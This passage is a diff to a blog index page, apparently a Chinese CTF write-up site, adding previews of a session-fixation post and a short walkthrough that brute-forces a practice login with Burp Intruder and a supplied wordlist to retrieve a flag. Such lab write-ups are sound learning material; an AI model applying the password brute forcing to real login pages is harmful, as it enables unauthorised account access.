+<p><img src="/images/writeups/Session%E5%9B%BA%E5%AE%9A%E6%94%BB%E5%87%BB%E7%94%84%E6%B4%AA%E7%90%B3_ef3eedfd.png" alt="Session固定攻击甄洪琳_ef3eedfd"></p>
+<p>CTF{ctfshow_session_fixation_is_a_common_web_security_vulnerability}</p>
 
             
         </div>
     </div>
     <div class="post-tags">
         
+        <span class="icon">
+            <i class="fa-solid fa-tags fa-fw"></i>
+        </span>
+        
+        
+        
+        <span class="tag">
+            
+            <a href="/tags/%E9%A2%98%E8%A7%A3/" style="color: #ff7d73">题解</a>
+        </span>
+        
+        <span class="tag">
+            
+            <a href="/tags/Session/" style="color: #00a596">Session</a>
+        </span>
+        
+    </div>
+    <a href="/2026/05/08/2026-05-08-Session%E5%9B%BA%E5%AE%9A%E6%94%BB%E5%87%BB/" class="go-post">阅读全文</a>
+</div>
+
+<div class="post">
+    <a href="/2026/05/08/2026-05-08-%E5%BC%B1%E5%8F%A3%E4%BB%A4%E7%88%86%E7%A0%B4/">
+        <h2 class="post-title">弱口令爆破甄洪琳</h2>
+    </a>
+    <div class="category-and-date">
+        
+        <span class="date">
+            <span class="icon">
+                <i class="fa-solid fa-calendar fa-fw"></i>
+            </span>
+            2026/5/8
+        </span>
         
         
     </div>
-    <a href="/2026/01/02/hello-world/" class="go-post">阅读全文</a>
+    <div class="description">
+        <div class="content" v-pre>
+            
+            <p>题目需要登录</p>
+<p><img src="/images/writeups/%E5%BC%B1%E5%8F%A3%E4%BB%A4%E7%88%86%E7%A0%B4%E7%94%84%E6%B4%AA%E7%90%B3_097d33ea.png" alt="弱口令爆破甄洪琳_097d33ea"></p>
+<p>根据题名字弱口令爆破加上附加，这里应该是要暴力破解，先抓登录包</p>
+<p><img src="/images/writeups/%E5%BC%B1%E5%8F%A3%E4%BB%A4%E7%88%86%E7%A0%B4%E7%94%84%E6%B4%AA%E7%90%B3_6d7e8f10.png" alt="弱口令爆破甄洪琳_6d7e8f10"></p>
+<p>发送到intruder,添加payload位置，将附件导入</p>
+<p>暴力破解得到密码为834100</p>
+<p><img src="/images/writeups/%E5%BC%B1%E5%8F%A3%E4%BB%A4%E7%88%86%E7%A0%B4%E7%94%84%E6%B4%AA%E7%90%B3_a70386f0.png" alt="弱口令爆破甄洪琳_a70386f0"></p>
+<p>根据响应flag在&#x2F;flag中，访问得到flag</p>
+<p><img src="/images/writeups/%E5%BC%B1%E5%8F%A3%E4%BB%A4%E7%88%86%E7%A0%B4%E7%94%84%E6%B4%AA%E7%90%B3_4f5bc3d9.png" alt="弱口令爆破甄洪琳_4f5bc3d9"></p>
+<p>CTF{this_is_a_sample_flag}</p>
+
+            
+        </div>
+    </div>
+    <div class="post-tags">
+        
+        <span class="icon">
+            <i class="fa-solid fa-tags fa-fw"></i>
+        </span>
+        
+        
+        
+        <span class="tag">
+            
+            <a href="/tags/%E9%A2%98%E8%A7%A3/" style="color: #03a9f4">题解</a>
+        </span>
+        
+        <span class="tag">
+            
+            <a href="/tags/%E7%88%86%E7%A0%B4/" style="color: #00a596">爆破</a>
+        </span>
+        
+    </div>
+    <a href="/2026/05/08/2026-05-08-%E5%BC%B1%E5%8F%A3%E4%BB%A4%E7%88%86%E7%A0%B4/" class="go-post">阅读全文</a>
 </div>
 
 
@@ -333,8 +751,23 @@
     
     <span class="current">1</span>
     
+    <a class="page-num" href="/page/2">
+        2
+    </a>
     
     
+    <a class="page-num" href="/page/3">
+        3
+    </a>
+    
+    
+    <span class="page-omit">...</span>
+    <a class="page-num" href="/page/16">16</a>
+    
+    
+    <a class="page-num" href="/page/2/">
+        <i class="fa-solid fa-caret-right fa-fw"></i>
+    </a>
     
 </div>
 
